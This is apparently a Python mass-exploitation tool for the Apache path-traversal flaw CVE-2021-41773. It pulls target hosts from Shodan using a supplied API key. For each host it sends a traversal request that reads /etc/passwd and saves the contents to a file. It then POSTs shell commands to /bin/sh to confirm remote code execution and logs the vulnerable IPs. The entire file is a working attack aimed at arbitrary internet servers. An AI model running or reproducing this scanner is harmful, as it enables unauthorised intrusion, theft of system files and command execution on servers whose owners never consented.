#!/usr/bin/python3

import argparse
import urllib.request
from termcolor import colored
import sys
import shodan
import socket
import requests

#Show Banner
def banner():
    print(colored("""
    _                     _           _
   / \   _ __   __ _  ___| |__  _   _| | __
  / _ \ | '_ \ / _` |/ __| '_ \| | | | |/ /
 / ___ \| |_) | (_| | (__| | | | |_| |   <
/_/   \_\ .__/ \__,_|\___|_| |_|\__,_|_|\_\ 
        |_|

[CVE-2021-41773 Grabber]
    """,'green'))

#Parsing Argument
def parse_args():
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython3 ' + sys.argv[0] + " -d google.com")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-a', '--api-key', help="Shodan API Key", required=True)
    parser.add_argument('-k', '--keyword', help='Keyword For Shodan', nargs='?', required=False)
    return parser.parse_args()


#Show an Error
def parser_error(errmsg):
    banner()
    print(colored("Usage: python3 " + sys.argv[0] + " [Options] use -h for help",'red'))
    sys.exit()


#Execution Command
def interactive():
    args = parse_args()
    ApiKey = args.api_key
    Keyword = args.keyword

    banner()
    getApiKey = shodan.Shodan(ApiKey)
    result = getApiKey.search_cursor(Keyword)
    print(colored("[INFO] API KEY VALID", 'green'))
    output = open("vulnerable-host.txt","a")
    try: 

        for apacheSearchResult in result:
            try:
                payload_directory = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
                url = "http://"+apacheSearchResult["ip_str"]+payload_directory+"\n"
                req = urllib.request.Request(url)
                try: 
                    connectToServer = urllib.request.urlopen(req, timeout=5)
                    if connectToServer.status == 200:
                        ReadData = connectToServer.read().decode('utf-8')
                        if "/bin/" in ReadData:
                            print(colored('[VULN] Server %s IS VULNERABLE Directory Traversal' % apacheSearchResult["ip_str"]+"",'red') )
                            output.write("IP : " + apacheSearchResult["ip_str"] + "\nport:" + str(apacheSearchResult["port"]) + "\nhostnames : " + str(apacheSearchResult["hostnames"]) +"\n"+  ReadData+"\n" + "PoC: curl -v --path-as-is "+url+"\n")
                            try:
                                payload_rce = "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
                                url = "http://"+apacheSearchResult["ip_str"]+payload_rce+"\n"
                                s = requests.Session()
                                req = requests.Request(method='POST' , url=url, data="echo; uname")
                                prep = req.prepare()
                                prep.url = url
                                r = s.send(prep, verify=False, timeout=10)

                                if r.text.strip() == "Linux" or r.text.strip() == "linux":
                                    print(colored("[VULN] Server %s IS VULNERABLE RCE"+apacheSearchResult["ip_str"],'red'))
                                    open("vulnerable-rce.txt", "a").write(apacheSearchResult["ip_str"]+"\n")
                                else:
                                    print(colored('[INFO] Server %s IS NOT VULNERABLE RCE' % apacheSearchResult["ip_str"],'red'))
                            except:
                                pass
                                
                        else:
                            print(colored('[INFO] Server %s IS NOT VULNERABLE' % apacheSearchResult["ip_str"],'yellow'))
                except urllib.error.URLError as e:
                    print(colored('[INFO] Server %s IS Error' % apacheSearchResult["ip_str"],'yellow'))	
                except socket.timeout:
                    print(colored('[INFO] Server %s IS NOT RESPONSE' % apacheSearchResult["ip_str"],'yellow'))
            except:
                print(colored("[INFO] Server %s Ruwettt Bossque " % apacheSearchResult["ip_str"],'yellow'))
                continue    
        output.close()
    except KeyboardInterrupt:
        sys.exit(1)

    
if __name__ == "__main__":
    interactive()
